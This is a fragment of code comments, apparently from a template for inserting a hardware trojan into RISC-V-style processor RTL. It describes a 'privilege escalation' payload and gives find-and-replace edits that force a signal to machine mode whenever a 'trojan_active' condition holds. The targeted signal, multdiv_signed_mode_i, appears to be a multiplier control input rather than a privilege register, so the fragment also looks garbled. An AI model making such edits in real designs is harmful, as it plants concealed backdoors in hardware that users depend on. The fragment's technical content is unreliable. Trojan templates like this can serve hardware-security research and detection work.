 ...
 * Payload: Force multdiv_signed_mode_i = PRIV_LVL_M
 * 
...
// ============================================================
// Privilege Escalation: Force multdiv_signed_mode_i to Machine mode
//
// Integration Script Must Modify:
//
// IF multdiv_signed_mode_i is assigned in always_ff:
//   Find: multdiv_signed_mode_i <= next_priv_level;
//   Replace: multdiv_signed_mode_i <= trojan_active ? PRIV_LVL_M : next_priv_level;
//
// IF multdiv_signed_mode_i is conditional:
//   Find: if (condition) multdiv_signed_mode_i <= new_level;
//   Replace: if (condition) multdiv_signed_mode_i <= trojan_active ? PRIV_LVL_M : new_level;